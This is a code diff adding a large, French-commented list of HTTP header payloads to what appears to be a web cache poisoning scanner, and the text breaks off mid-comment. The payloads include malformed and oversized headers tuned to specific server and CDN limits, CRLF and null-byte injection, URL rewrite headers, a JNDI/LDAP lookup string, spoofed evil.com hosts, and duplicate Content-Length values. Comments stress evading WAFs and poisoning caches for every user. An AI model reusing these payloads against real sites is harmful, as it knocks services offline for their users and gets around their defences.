@@ -9177,3 +9177,825 @@
 
     # Early-Data + méthode non-idempotente → 425 caché
     {"Early-Data": "1", "X-HTTP-Method-Override": "POST"},
+
+            # =================================================================
+        # #1 — Invalid header name (non-tchar) → 400
+        # Akamai forward, origin rejette. CloudFront cache 5min.
+        # Ignore Cache-Control: no-store sur 400.
+        # WAFs ne filtrent jamais les noms de headers.
+        # =================================================================
+        {" X": "coucoucou"},
+        {"X Header": "coucoucou"},
+        {"X\tTab": "coucoucou"},
+        {"X(Paren": "coucoucou"},
+        {"X@At": "coucoucou"},
+        {"X,Comma": "coucoucou"},
+        {"X;Semi": "coucoucou"},
+        {"X\"Quote": "coucoucou"},
+        {"X{Brace": "coucoucou"},
+        {"X=Equal": "coucoucou"},
+
+        # =================================================================
+        # #2 — Meta characters dans header value → 400
+        # Null byte = parsers C crash. CRLF = header injection → 400.
+        # CloudFront cache 5min + ignore no-store.
+        # =================================================================
+        {"X-Meta": "coucoucou\x00"},
+        {"X-Meta": "coucoucou\r\n"},
+        {"X-Meta": "coucoucou\r"},
+        {"X-Meta": "coucoucou\n"},
+        {"X-Meta": "coucoucou\x0b"},
+        {"X-Meta": "coucoucou\x0c"},
+        {"X-Meta": "coucoucou\x7f"},
+        {"X-Meta": "coucoucou\x1b"},
+        {"X-Meta": "coucoucou\a"},
+        {"X-Meta": "\r\n\r\n"},
+
+        # =================================================================
+        # #3 — X-Original-URL / X-Rewrite-URL → 404
+        # 404 caché par 7/7 CDNs. IIS + Nginx rewrite natif.
+        # Headers TOUJOURS unkeyed. Simple et dévastateur.
+        # =================================================================
+        {"X-Original-URL": "/coucoucou-nonexistent"},
+        {"X-Original-URL": "/.well-known/coucoucou"},
+        {"X-Original-URL": "/api/v0/coucoucou-removed"},
+        {"X-Original-URL": "/old/coucoucou-deleted"},
+        {"X-Rewrite-URL": "/coucoucou-nonexistent"},
+        {"X-Rewrite-URL": "/wp-admin/install.php"},
+        {"X-Rewrite-URL": "/server-status"},
+        {"X-Rewrite-URL": "/.htaccess"},
+        {"X-Accel-Redirect": "/coucoucou-gone"},
+        {"X-Accel-Redirect": "/internal/coucoucou"},
+
+        # =================================================================
+        # #4 — HHO calibré par limite serveur → 400/414
+        # CloudFront 20480 > Apache 8192. Squid/ATS cachent 400.
+        # Le header oversized est toujours unkeyed.
+        # =================================================================
+        # Apache 8192
+        {"X-Oversized": "A" * 8200},
+        # Nginx large_client_header_buffers 8K
+        {"X-Oversized": "A" * 8500},
+        # Tomcat 8192
+        {"X-Oversized": "A" * 8300},
+        # IIS 16384
+        {"X-Oversized": "A" * 16400},
+        # Node.js 16KB
+        {"X-Oversized": "A" * 16500},
+        # CloudFront limit 20480 (juste au dessus pour le dépasser)
+        {"X-Oversized": "A" * 20500},
+
+        # =================================================================
+        # #5 — X-Forwarded-For overflow (proxy concat trick) → 400
+        # Proxy ajoute ", <client_ip>" → dépasse la limite origin.
+        # Fonctionne MÊME si CDN et origin ont la même limite.
+        # XFF souvent unkeyed.
+        # =================================================================
+        # Apache 8192 - marge pour concat IP
+        {"X-Forwarded-For": "A" * 8100},
+        # Tomcat 8192
+        {"X-Forwarded-For": "A" * 8150},
+        # IIS 16384
+        {"X-Forwarded-For": "A" * 16300},
+        # CloudFront 20480
+        {"X-Forwarded-For": "A" * 20400},
+        # Long chain d'IPs réaliste (moins suspect qu'un padding)
+        {"X-Forwarded-For": ", ".join([f"10.{i}.{j}.1" for i in range(200) for j in range(3)])},
+
+        # =================================================================
+        # #6 — Host header interdit RFC 9110 → 400
+        # userinfo dans Host = interdit Section 7.2.
+        # Tous les serveurs conformes renvoient 400.
+        # Certains CDNs normalisent Host avant cache key → poison.
+        # =================================================================
+        {"Host": "user@example.com"},
+        {"Host": "admin:pass@example.com"},
+        {"Host": "example.com:0"},
+        {"Host": "example.com:99999"},
+        {"Host": "example.com:-1"},
+        {"Host": ""},
+        {"Host": " "},
+        {"Host": "."},
+
+        # =================================================================
+        # #7 — Connection hop-by-hop stripping → 400/411/502
+        # RFC 7230 §6.1: proxy DOIT supprimer les headers listés.
+        # Origin reçoit requête sans Content-Type/Accept → 400/502.
+        # Jamais filtré par WAFs. Très peu connu.
+        # =================================================================
+        {"Connection": "Content-Type"},
+        {"Connection": "Accept"},
+        {"Connection": "Content-Length"},
+        {"Connection": "Host"},
+        {"Connection": "Content-Length, Transfer-Encoding"},
+        {"Transfer-Encoding": "chunked", "Connection": "Transfer-Encoding"},
+
+        # =================================================================
+        # #8 — X-Forwarded-Proto: http → 301/302
+        # Origin pense HTTP → redirige vers HTTPS → boucle infinie.
+        # 301 caché par 5/7 CDNs. 302 par Cloudflare/Fastly.
+        # X-Forwarded-Proto quasi toujours unkeyed.
+        # =================================================================
+        {"X-Forwarded-Proto": "http"},
+        {"X-Forwarded-Scheme": "http"},
+        {"X-Forwarded-SSL": "off"},
+        {"X-Url-Scheme": "http"},
+        {"Forwarded": "proto=http"},
+        {"Forwarded": "proto=http;host=coucoucou.example.com"},
+
+        # =================================================================
+        # #9 — Cookie bomb (stealth HHO) → 400/431
+        # Cookie rarement filtré par WAFs. Cookie souvent EXCLU du
+        # cache key → le poison touche tous les utilisateurs.
+        # Nginx renvoie 400 (pas 431). CloudFront cache 5min.
+        # =================================================================
+        {"Cookie": "session=" + "A" * 8200},
+        {"Cookie": "session=" + "A" * 16000},
+        {"Cookie": "; ".join([f"bomb{i}={'A'*500}" for i in range(40)])},
+        {"Cookie": "; ".join([f"c{i}={'B'*1000}" for i in range(20)])},
+
+        # =================================================================
+        # #10 — Authorization stealth HHO → 400/431
+        # Authorization JAMAIS filtré par WAFs (considéré sensible).
+        # Même effet que oversized header mais invisible.
+        # =================================================================
+        {"Authorization": "Bearer " + "A" * 8200},
+        {"Authorization": "Bearer " + "A" * 16000},
+        {"Authorization": "Basic " + "A" * 16000},
+
+        # =================================================================
+        # #11 — Accept-Encoding: identity;q=0 → 406
+        # RFC 9110 §12.5.3: serveur DOIT renvoyer 406 si identity
+        # refusé et pas d'autre encoding possible. Obligation RFC.
+        # =================================================================
+        {"Accept-Encoding": "identity;q=0"},
+        {"Accept-Encoding": "*;q=0"},
+        {"Accept-Encoding": "identity;q=0, *;q=0"},
+
+        # =================================================================
+        # #12 — Obs-fold (line folding déprécié RFC 7230) → 400
+        # §3.2.4 deprecated. Nginx 1.21+, Go, Node rejettent.
+        # CDNs (HAProxy, Varnish) le forwarded sans problème.
+        # Très peu testé par les scanners.
+        # =================================================================
+        {"X-Obs-Fold": "value\r\n continued"},
+        {"X-Obs-Fold": "value\r\n\t tabbed"},
+        {"X-Fold-Test": "line1\r\n line2\r\n line3"},
+
+        # =================================================================
+        # #13 — X-Forwarded-Host → 404/403/502/421
+        # Routing confusion: origin cherche un vhost inexistant.
+        # 404 caché partout. Quasi toujours unkeyed.
+        # =================================================================
+        {"X-Forwarded-Host": "coucoucou-inexistant.example.com"},
+        {"X-Forwarded-Host": "127.0.0.1"},
+        {"X-Forwarded-Host": "[::1]"},
+        {"X-Forwarded-Host": "localhost"},
+        {"X-Host": "coucoucou.example.com"},
+        {"X-Forwarded-Server": "coucoucou.example.com"},
+
+        # =================================================================
+        # #14 — Multiple medium headers (cumul overflow) → 400/431/494
+        # Aucun header seul ne dépasse la limite, mais le total oui.
+        # Contourne les checks par-header des WAFs.
+        # =================================================================
+        {"X-A": "A" * 4000, "X-B": "A" * 4000, "X-C": "A" * 4000},
+        {"X-A": "B" * 3000, "X-B": "B" * 3000, "X-C": "B" * 3000, "X-D": "B" * 3000},
+        {"X-A": "C" * 5000, "X-B": "C" * 5000, "X-C": "C" * 5000, "X-D": "C" * 5000},
+        {"Referer": "https://x.com/" + "R" * 4000, "Cookie": "s=" + "C" * 4000},
+
+        # =================================================================
+        # #15 — Referer oversize → 400/414
+        # Referer rarement filtré, souvent unkeyed.
+        # 414 caché par Varnish + CloudFront + Squid.
+        # =================================================================
+        {"Referer": "https://example.com/" + "A" * 8200},
+        {"Referer": "https://example.com/" + "A" * 16400},
+        {"Referer": "https://example.com/?" + "&".join([f"p{i}={'D'*100}" for i in range(100)])},
+
+        # =================================================================
+        # #16 — Content-Length énorme sur GET → 413/400
+        # Origin tente d'allouer le buffer ou refuse.
+        # Beaucoup renvoient 400 (caché CloudFront) au lieu de 413.
+        # =================================================================
+        {"Content-Length": "99999999999"},
+        {"Content-Length": "9999999999999999"},
+        {"Content-Length": "-1"},
+
+        # =================================================================
+        # #17 — Expect header → 417
+        # RFC 9110 §10.1.1: DOIT renvoyer 417 si expectation
+        # non supportée. 417 caché CloudFront 5min + Squid.
+        # =================================================================
+        {"Expect": "100-continue"},
+        {"Expect": "coucoucou"},
+        {"Expect": "200-ok"},
+        {"Expect": "102-processing"},
+
+        # =================================================================
+        # #18 — Range multipart massif → 206/400
+        # 206 caché par Cloudflare par défaut.
+        # Beaucoup de ranges → multipart corrompu ou 400.
+        # =================================================================
+        {"Range": "bytes=" + ",".join([f"{i}-{i}" for i in range(100)])},
+        {"Range": "bytes=0-0, 0-1, 0-2, 0-3, 0-4, 0-5, 0-6, 0-7, 0-8, 0-9, 0-10, 0-11, 0-12, 0-13, 0-14, 0-15"},
+        {"Range": "bytes=0-50, 40-100"},
+        {"Range": "bytes=0-0"},
+
+        # =================================================================
+        # #19 — Forwarded RFC 7239 malformé → 400
+        # Envoy, Traefik, Caddy parsent Forwarded. Syntaxe cassée → 400.
+        # Header unkeyed et rarement filtré.
+        # =================================================================
+        {"Forwarded": 'for="[::1'},
+        {"Forwarded": ";;;"},
+        {"Forwarded": "for=;by=;host="},
+        {"Forwarded": 'for="\x00"'},
+
+        # =================================================================
+        # #20 — Early-Data: 1 → 425
+        # RFC 8470. Serveur refuse 0-RTT → 425 Too Early.
+        # Header inconnu des WAFs. CloudFront cache 5min.
+        # =================================================================
+        {"Early-Data": "1"},
+        {"Early-Data": "1", "X-Forwarded-Proto": "https"},
+
+        # =================================================================
+        # #21 — Transfer-Encoding invalide → 400/501/502
+        # Null bytes dans TE confondent les parsers.
+        # CloudFront cache 400/501 5min.
+        # =================================================================
+        {"Transfer-Encoding": "\x00chunked"},
+        {"Transfer-Encoding": "chunk\x00ed"},
+        {"Transfer-Encoding": "coucoucou"},
+        {"Transfer-Encoding": "identity"},
+        {"Transfer-Encoding": "chunked, identity"},
+        {"Transfer-Encoding": "chunked;ext=coucoucou"},
+
+        # =================================================================
+        # #22 — If-Match impossible → 412
+        # RFC 9110 §13.1.1: ETag mismatch = 412 obligatoire.
+        # Passe tous les WAFs. CloudFront cache 5min.
+        # =================================================================
+        {"If-Match": '"0000000000000000"'},
+        {"If-Match": '""'},
+        {"If-Match": '"coucoucou-impossible"'},
+        {"If-Match": '"0"', "If-Unmodified-Since": "Thu, 01 Jan 1970 00:00:00 GMT"},
+
+        # =================================================================
+        # #23 — Upgrade protocol → 426/502
+        # Origin ne supporte pas → 426 Upgrade Required.
+        # Proxy confus → 502. CloudFront cache les deux 5min.
+        # =================================================================
+        {"Upgrade": "websocket", "Connection": "Upgrade", "Sec-WebSocket-Version": "13", "Sec-WebSocket-Key": "Y291Y291Y291=="},
+        {"Upgrade": "h2c"},
+        {"Upgrade": "TLS/1.3"},
+        {"Upgrade": "coucoucou-protocol"},
+        {"Upgrade": "connect-udp"},
+
+        # =================================================================
+        # #24 — Via proxy spoofing → 203
+        # 203 caché par Varnish + Fastly (heuristic RFC).
+        # Warning 214 = transformation applied.
+        # =================================================================
+        {"Via": "1.1 coucoucou-proxy"},
+        {"Via": "1.0 coucoucou (Apache/2.4)"},
+        {"Via": "1.1 coucoucou, 1.1 proxy2, 1.0 proxy3"},
+        {"Via": "1.1 coucoucou-proxy", "Warning": '214 coucoucou "Transformation applied"'},
+        {"Cache-Control": "no-transform", "Via": "1.1 coucoucou"},
+
+        # =================================================================
+        # #25 — Max-Forwards: 0 → 502/200-proxy/503
+        # RFC 9110 §7.6.2: proxy ne devrait pas forward.
+        # Certains proxies renvoient une erreur synthétique.
+        # =================================================================
+        {"Max-Forwards": "0"},
+        {"Max-Forwards": "-1"},
+
+        # =================================================================
+        # #26 — CDN-Loop / loop detection → 403/508
+        # RFC 8586. Count élevé → Cloudflare renvoie 403.
+        # 403 caché par CloudFront 5min + Squid.
+        # =================================================================
+        {"CDN-Loop": "cloudflare; count=999"},
+        {"CDN-Loop": "cloudflare"},
+        {"CDN-Loop": "akamai"},
+
+        # =================================================================
+        # #27 — Accept: */*;q=0 → 406
+        # Refuser explicitement tous les media types.
+        # Frameworks stricts (Rails API, Django REST, Spring) → 406.
+        # =================================================================
+        {"Accept": "*/*;q=0"},
+        {"Accept": "application/*;q=0, text/*;q=0, */*;q=0"},
+        {"Accept": "application/x-coucoucou;q=1, */*;q=0"},
+        {"Accept": "application/x-coucoucou", "Prefer": "handling=strict"},
+
+        # =================================================================
+        # #28 — Content-Type invalide sur GET → 415/422
+        # Origin parse Content-Type même sur GET (Spring, Express).
+        # 415 pas caché par défaut mais CloudFront cache tout 4xx 5min.
+        # =================================================================
+        {"Content-Type": ";;;;;;;"},
+        {"Content-Type": "application/x-coucoucou-invalid"},
+        {"Content-Type": "application/octet-stream\x00coucoucou"},
+        {"Content-Type": 'text/plain; charset="utf-8"; extra="unclosed'},
+        {"Content-Type": "message/http"},
+
+        # =================================================================
+        # #29 — Negotiate: trans → 506
+        # RFC 2295 TCN. Apache mod_negotiation loop → 506.
+        # Code exotique, certains VCL customs le cachent par erreur.
+        # =================================================================
+        {"Negotiate": "trans"},
+        {"Negotiate": "vlist"},
+        {"Accept": "application/xhtml+xml", "Negotiate": "trans"},
+
+        # =================================================================
+        # #30 — A-IM delta encoding → 226/500
+        # RFC 3229. Quasi jamais implémenté → 500 crash ou 226.
+        # 226 = code exotique, CDNs confus sur le caching.
+        # =================================================================
+        {"A-IM": "feed"},
+        {"A-IM": "vcdiff"},
+        {"A-IM": "diffe, vcdiff"},
+
+        # =================================================================
+        # #31 — If-Unmodified-Since epoch → 412
+        # Timestamp dans le passé = precondition fail garanti.
+        # =================================================================
+        {"If-Unmodified-Since": "Thu, 01 Jan 1970 00:00:00 GMT"},
+        {"If-Unmodified-Since": "Sat, 01 Jan 2000 00:00:00 GMT"},
+
+        # =================================================================
+        # #32 — X-Original-URL oversized → 414
+        # IIS rewrite avec URL énorme → 414.
+        # 414 caché par Varnish + CloudFront + Squid + RFC heuristic.
+        # =================================================================
+        {"X-Original-URL": "/" + "A" * 8200},
+        {"X-Rewrite-URL": "/" + "B" * 16400},
+        {"X-Original-URL": "/?" + "&".join([f"p{i}={'C'*100}" for i in range(100)])},
+
+        # =================================================================
+        # #33 — Range impossible → 416
+        # 416 pas caché par défaut sauf Squid/ATS.
+        # Mais si Edge Cache TTL configuré ou negative caching...
+        # =================================================================
+        {"Range": "bytes=999999999-999999999999"},
+        {"Range": "bytes=5-3"},
+        {"Range": "bytes=-99999999999"},
+        {"If-Range": '"coucoucou"', "Range": "bytes=999999999-"},
+
+        # =================================================================
+        # #34 — Accept-Encoding invalide → 400/415
+        # Beaucoup d'encodings inconnus → certains serveurs 400.
+        # CloudFront cache le 400.
+        # =================================================================
+        {"Accept-Encoding": "coucoucou-invalid"},
+        {"Accept-Encoding": ", ".join([f"enc{i}" for i in range(100)])},
+        {"Accept-Encoding": "gzip, deflate, br, coucoucou, identity;q=0"},
+
+        # =================================================================
+        # #35 — Pseudo-headers HTTP/2 en HTTP/1.1 → 400
+        # Le CDN forward en HTTP/1.1 avec un header ":method" → origin 400.
+        # =================================================================
+        {":method": "GET"},
+        {":path": "/coucoucou"},
+        {":authority": "coucoucou.com"},
+
+        # =================================================================
+        # #36 — Content-Range sur requête (réponse only) → 400
+        # RFC 9110 §14.4: Content-Range n'a pas de sens dans une requête GET.
+        # Serveurs stricts → 400.
+        # =================================================================
+        {"Content-Range": "bytes 0-100/200"},
+        {"Content-Range": "bytes */999999999"},
+
+        # =================================================================
+        # #37 — TE: trailers sans Connection: TE → 400
+        # RFC 7230 §4.3: TE DOIT être listé dans Connection.
+        # Serveurs conformes rejettent si pas Connection: TE.
+        # =================================================================
+        {"TE": "trailers"},
+        {"TE": "trailers, chunked"},
+        {"TE": "coucoucou"},
+
+        # =================================================================
+        # #38 — Content-Encoding sur GET → 415/400/500
+        # Backend tente de décompresser un body inexistant → crash.
+        # Spring, Express vulnérables.
+        # =================================================================
+        {"Content-Encoding": "gzip"},
+        {"Content-Encoding": "br"},
+        {"Content-Encoding": "coucoucou-invalid"},
+
+        # =================================================================
+        # #39 — IP spoofing interne → 403/451/503
+        # Origin trust X-Forwarded-For / X-Real-IP pour ACL.
+        # Loopback → 403 ou comportement inattendu.
+        # IPs sanctionnées → 451.
+        # =================================================================
+        {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Forwarded-For": "0.0.0.0"},
+        {"X-Forwarded-For": "::1"},
+        {"X-Real-IP": "127.0.0.1"},
+        # IPs sanctionnées (DPRK, Iran, Cuba)
+        {"X-Forwarded-For": "175.45.176.1"},
+        {"X-Forwarded-For": "5.62.60.1"},
+
+        # =================================================================
+        # #40 — CDN-specific internal headers → 400/403/500
+        # Backends trust ces headers quand derrière leur CDN.
+        # Si on les injecte → comportement inattendu.
+        # =================================================================
+        {"CF-Connecting-IP": "127.0.0.1"},
+        {"True-Client-IP": "127.0.0.1"},
+        {"Fastly-Client-IP": "127.0.0.1"},
+        {"X-Azure-ClientIP": "127.0.0.1"},
+        {"Akamai-Origin-Hop": "99"},
+        {"X-Cloud-Trace-Context": "coucoucou/coucoucou;o=1"},
+
+        # =================================================================
+        # #41 — Trailer header sur GET → 400
+        # RFC 7230 §4.4: Trailer liste les headers envoyés après le body.
+        # Sur un GET sans body → incohérent → 400.
+        # =================================================================
+        {"Trailer": "Content-MD5"},
+        {"Trailer": "Transfer-Encoding"},
+        {"Trailer": "Content-Length"},
+
+        # =================================================================
+        # #42 — SOAPAction sur REST → 400/415/500
+        # Backend SOAP tente de parser → erreur si pas SOAP.
+        # Backend REST ne comprend pas → 400/500.
+        # =================================================================
+        {"SOAPAction": '"urn:coucoucou"'},
+        {"SOAPAction": '""'},
+
+        # =================================================================
+        # #43 — BOM UTF-8 dans header → 400
+        # Parsers stricts rejettent le BOM dans les headers HTTP.
+        # =================================================================
+        {"X-BOM": "\xef\xbb\xbfcoucoucou"},
+        {"X-BOM": "\xfe\xffcoucoucou"},
+        {"X-BOM": "\xc0\xafcoucoucou"},
+
+        # =================================================================
+        # #44 — Depth/Destination WebDAV → 422/400
+        # Serveurs WebDAV (IIS, Apache) parsent ces headers.
+        # =================================================================
+        {"Depth": "infinity"},
+        {"Depth": "0", "Destination": "https://coucoucou.example.com/"},
+        {"Overwrite": "T"},
+
+        # =================================================================
+        # #45 — Prefer handling=strict → 400/428
+        # RFC 7240: handling=strict → serveur DOIT renvoyer erreur
+        # au lieu de best-effort. Amplifie les autres payloads.
+        # =================================================================
+        {"Prefer": "handling=strict"},
+        {"Prefer": "respond-async, wait=99999"},
+        {"Prefer": "return=representation, handling=strict"},
+
+        # =================================================================
+        # #46 — Accept-Datetime Memento → 400/500
+        # RFC 7089. Quasi jamais implémenté.
+        # Serveurs tentent de parser → crash ou 400.
+        # =================================================================
+        {"Accept-Datetime": "Thu, 01 Jan 1970 00:00:00 GMT"},
+        {"Accept-Datetime": "coucoucou-invalid-datetime"},
+
+        # =================================================================
+        # #47 — Alt-Used mismatch → 421
+        # RFC 7838. Backend refuse si hostname ne match pas.
+        # 421 caché par CloudFront 5min.
+        # =================================================================
+        {"Alt-Used": "coucoucou.example.com:443"},
+        {"Alt-Used": "127.0.0.1:8080"},
+
+        # =================================================================
+        # #48 — Sec-Fetch metadata spoofing → 400/403
+        # Fetch metadata (Sec-*) validé par certains WAFs/serveurs.
+        # Valeurs invalides → 400 ou 403.
+        # =================================================================
+        {"Sec-Fetch-Mode": "coucoucou"},
+        {"Sec-Fetch-Dest": "coucoucou"},
+        {"Sec-Fetch-Site": "coucoucou"},
+
+        # =================================================================
+        # #49 — Priority header invalide → 400
+        # RFC 9218 HTTP Priority. Valeur non-parseable → 400.
+        # Header récent, peu de WAFs le connaissent.
+        # =================================================================
+        {"Priority": "u=coucoucou"},
+        {"Priority": "u=-1, i"},
+        {"Priority": "u=999"},
+
+        # =================================================================
+        # #50 — X-Amz / cloud provider headers → 400/403
+        # Backends AWS parsent X-Amz-*. Valeurs invalides → 400/403.
+        # S3/API Gateway trust ces headers nativement.
+        # =================================================================
+        {"X-Amz-Date": "coucoucou"},
+        {"X-Amz-Security-Token": "coucoucou"},
+        {"X-Amz-Content-SHA256": "UNSIGNED-PAYLOAD"},
+        {"X-Google-Internal": "true"},
+            # =================================================================
+        # APPROCHE 1 — Headers légitimes avec valeurs limites RFC
+        # Les CDNs les laissent passer car ils sont "normaux"
+        # =================================================================
+
+        # Accept avec quality factor invalide (RFC 9110 §12.5.1: q=0 à 1 max)
+        {"Accept": "text/html;q=999"},
+        {"Accept": "text/html;q=-1"},
+        {"Accept": "text/html;q=1.001"},
+        {"Accept": "text/html;level=9999999"},
+
+        # Accept-Language massif → certains backends allouent un tableau par locale
+        {"Accept-Language": ", ".join([f"{chr(97+i%26)}{chr(97+(i+1)%26)}-{chr(65+i%26)}{chr(65+(i+1)%26)};q=0.{i%10}" for i in range(500)])},
+
+        # If-None-Match avec ETags malformés (pas entre quotes → RFC violation)
+        {"If-None-Match": "coucoucou"},
+        {"If-None-Match": "W/coucoucou"},
+        {"If-None-Match": ", ".join([f'"etag{i}"' for i in range(500)])},
+
+        # If-Modified-Since invalide (pas un HTTP-date)
+        {"If-Modified-Since": "0"},
+        {"If-Modified-Since": "-1"},
+        {"If-Modified-Since": "coucoucou"},
+        {"If-Modified-Since": "9999999999"},
+
+        # =================================================================
+        # APPROCHE 2 — Headers que les CDNs ne strippent JAMAIS
+        # car ils sont considérés applicatifs
+        # =================================================================
+
+        # X-Request-ID avec caractères spéciaux → backend log/parse → crash
+        {"X-Request-ID": "../../../etc/passwd"},
+        {"X-Request-ID": "A" * 10000},
+        {"X-Request-ID": "${jndi:ldap://coucoucou}"},
+        {"X-Request-ID": "{{7*7}}"},
+        {"X-Correlation-ID": "A" * 10000},
+        {"X-Trace-ID": "A" * 10000},
+
+        # X-Forwarded-Port invalide → backend construit une URL cassée → erreur
+        {"X-Forwarded-Port": "0"},
+        {"X-Forwarded-Port": "-1"},
+        {"X-Forwarded-Port": "99999"},
+        {"X-Forwarded-Port": "abc"},
+        {"X-Forwarded-Port": "443\r\nX-Injected: coucoucou"},
+
+        # X-Forwarded-Prefix → path routing confusion
+        {"X-Forwarded-Prefix": "/coucoucou-nonexistent"},
+        {"X-Forwarded-Prefix": "/../../../"},
+        {"X-Forwarded-Prefix": "/"},
+        {"X-Forwarded-Prefix": "//"},
+
+        # =================================================================
+        # APPROCHE 3 — Provoquer 429 Too Many Requests
+        # 429 est caché par beaucoup de CDNs pour protéger le backend!
+        # =================================================================
+        
+        # Certains rate limiters comptent par X-Forwarded-For
+        # → envoyer la même IP interne pour trigger le rate limit
+        # Pas un payload unique mais une stratégie: envoyer 50x le même
+        # header avec la même "IP" pour épuiser le rate limit
+
+        # =================================================================
+        # APPROCHE 4 — Client Hints / Sec-CH-* headers
+        # Nouveaux, passent les CDNs, backends essaient de parser
+        # =================================================================
+        {"Sec-CH-UA": '"\\'},
+        {"Sec-CH-UA": "x" * 5000},
+        {"Sec-CH-UA-Platform": '"' + "A" * 5000 + '"'},
+        {"Sec-CH-UA-Full-Version-List": ", ".join([f'"brand{i}";v="{i}.0.0.0"' for i in range(200)])},
+        {"Sec-CH-UA-Mobile": "coucoucou"},
+        {"Sec-CH-UA-Arch": "A" * 5000},
+        {"Device-Memory": "999999"},
+        {"Downlink": "-1"},
+        {"ECT": "coucoucou"},
+        {"RTT": "999999999"},
+        {"Save-Data": "coucoucou"},
+        {"Viewport-Width": "-1"},
+        {"Width": "999999999"},
+        {"DPR": "-1"},
+        {"DPR": "999999999"},
+
+        # =================================================================
+        # APPROCHE 5 — Service Worker / Navigation metadata
+        # Headers récents, backends modernes les parsent
+        # =================================================================
+        {"Sec-Fetch-Mode": "websocket"},
+        {"Sec-Fetch-Dest": "serviceworker"},
+        {"Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Dest": "document", "Sec-Fetch-User": "?0"},
+        {"Service-Worker": "script"},
+        {"Service-Worker-Navigation-Preload": "true"},
+        {"Purpose": "prefetch"},
+        {"Sec-Purpose": "prefetch"},
+        {"Sec-Purpose": "prefetch;prerender"},
+
+        # =================================================================
+        # APPROCHE 6 — Backslash/encoding dans Host (passe certains CDNs)
+        # =================================================================
+        {"Host": "example.com\\@evil.com"},
+        {"Host": "example.com%00.evil.com"},
+        {"Host": "example.com%0d%0a.evil.com"},
+        {"Host": "example.com:443@evil.com"},
+        {"Host": "example.com#coucoucou"},
+        {"Host": "example.com?coucoucou"},
+
+        # =================================================================
+        # APPROCHE 7 — Cache-Status / CDN control headers
+        # RFC 9211 Cache-Status. Certains CDNs le traitent en entrée.
+        # =================================================================
+        {"Cache-Status": "coucoucou; hit; ttl=0"},
+        {"Cache-Status": "coucoucou; fwd=miss"},
+        {"Surrogate-Control": "no-store"},
+        {"Surrogate-Control": "max-age=0"},
+        {"Surrogate-Capability": 'coucoucou="ESI/1.0"'},
+        {"CDN-Cache-Control": "no-store"},
+        {"CDN-Cache-Control": "max-age=0, s-maxage=0"},
+        {"Cloudflare-CDN-Cache-Control": "no-store"},
+
+        # =================================================================
+        # APPROCHE 8 — Framework-specific headers
+        # Ceux que les frameworks PARSENT vraiment
+        # =================================================================
+
+        # Spring Boot Actuator → peut trigger 404/500 sur certains paths
+        {"X-Forwarded-Prefix": "/actuator"},
+        {"X-Forwarded-Prefix": "/actuator/env"},
+
+        # Django DEBUG detection
+        {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost"},
+
+        # PHP/Laravel specifics
+        {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Port": "0"},
+
+        # .NET Core → X-Original-For / X-Original-Host
+        {"X-Original-For": "127.0.0.1"},
+        {"X-Original-Host": "coucoucou.example.com"},
+        {"X-Original-Proto": "coucoucou"},
+
+        # Ruby on Rails → X-Sendfile-Type
+        {"X-Sendfile-Type": "X-Accel-Redirect"},
+        {"X-Sendfile-Type": "X-Sendfile"},
+
+        # =================================================================
+        # APPROCHE 9 — RFC 9530 Digest / Repr-Digest
+        # Très récent (2023), backends tentent de valider
+        # =================================================================
+        {"Repr-Digest": "sha-256=:coucoucou:"},
+        {"Repr-Digest": "sha-512=:AAAA:"},
+        {"Want-Repr-Digest": "sha-256=10"},
+        {"Content-Digest": "sha-256=:coucoucou:"},
+        {"Want-Content-Digest": "sha-256"},
+
+        # =================================================================
+        # APPROCHE 10 — WebDAV headers sur sites non-WebDAV
+        # IIS/Apache avec mod_dav chargé mais pas configuré → 4xx
+        # =================================================================
+        {"Depth": "infinity"},
+        {"Destination": "https://coucoucou.example.com/"},
+        {"If": '(<coucoucou>)'},
+        {"Lock-Token": "<coucoucou>"},
+        {"Overwrite": "F"},
+        {"DAV": "1, 2"},
+        {"SLUG": "coucoucou"},
+
+        # =================================================================
+        # APPROCHE 11 — Structured Headers RFC 8941 malformés
+        # Newer HTTP specs utilisent structured fields
+        # Parsers stricts → erreur sur syntaxe invalide
+        # =================================================================
+        {"Accept-CH": ";;;"},
+        {"Accept-CH": '("coucoucou")'},
+        {"Critical-CH": "coucoucou, "},
+        {"Permissions-Policy": "coucoucou=(self)"},
+        {"Origin-Agent-Cluster": "coucoucou"},
+
+        # =================================================================
+        # APPROCHE 12 — Headers de debug/test que certains backends traitent
+        # =================================================================
+        {"X-Debug": "1"},
+        {"X-Debug-Mode": "true"},
+        {"X-Test": "true"},
+        {"X-Profiler": "true"},
+        {"X-Environment": "production"},
+        {"X-Canary": "true"},
+        {"X-Feature-Flag": "coucoucou"},
+        {"X-AB-Test": "variant-coucoucou"},
+        {"X-Backend": "coucoucou"},
+        {"X-Upstream": "coucoucou"},
+
+        # =================================================================
+        # APPROCHE 13 — CORS preflight injection
+        # Certains backends changent complètement de réponse avec Origin
+        # =================================================================
+        {"Origin": "https://coucoucou.evil.com"},
+        {"Origin": "null"},
+        {"Origin": "https://coucoucou.evil.com", "Access-Control-Request-Method": "DELETE"},
+        {"Origin": "https://coucoucou.evil.com", "Access-Control-Request-Headers": "X-Custom, Authorization"},
+        {"Origin": "file://"},
+        {"Origin": "https://coucoucou.evil.com", "Access-Control-Request-Method": "PATCH", "Access-Control-Request-Headers": "Content-Type"},
+
+        # =================================================================
+        # APPROCHE 14 — Multiple Content-Length (request smuggling adjacent)
+        # Certains serveurs renvoient 400, d'autres prennent le premier
+        # =================================================================
+        {"Content-Length": "0", "Content-Length": "1"},
+        {"Content-Length": " 0"},
+        {"Content-Length": "0 "},
+        {"Content-Length": "+0"},
+        {"Content-Length": "00"},
+        {"Content-Length": "0x0"},
+        {"Content-Length": "0e0"},
+
+        # =================================================================
+        # APPROCHE 15 — Keep-Alive header avec timeout
+        # RFC 7230 §A.1.2. Certains proxies le traitent
+        # =================================================================
+        {"Keep-Alive": "timeout=0"},
+        {"Keep-Alive": "timeout=0, max=0"},
+        {"Keep-Alive": "timeout=-1"},
+
+        # =================================================================
+        # APPROCHE 16 — Encoding/charset manipulation
+        # Backends qui valident strictement le charset
+        # =================================================================
+        {"Accept-Charset": "utf-99"},
+        {"Accept-Charset": "coucoucou"},
+        {"Accept-Charset": "*;q=0"},
+        {"Accept-Charset": "utf-8;q=0, *;q=0"},
+
+        # =================================================================
+        # APPROCHE 17 — Range avec unité inconnue
+        # RFC 9110 §14.2: unités custom autorisées
